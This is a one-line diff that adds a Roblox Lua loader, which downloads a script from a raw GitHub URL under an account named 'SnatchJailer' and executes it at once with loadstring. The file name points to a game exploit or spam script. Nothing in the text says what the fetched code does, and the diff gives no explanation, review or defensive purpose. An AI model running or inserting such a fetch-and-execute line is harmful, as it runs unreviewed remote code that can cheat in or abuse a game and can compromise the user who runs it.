@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/wideopen-motorcycle-2xp-weekend-customiz-spam6-v4d1azpim8y0rv.lua"))()
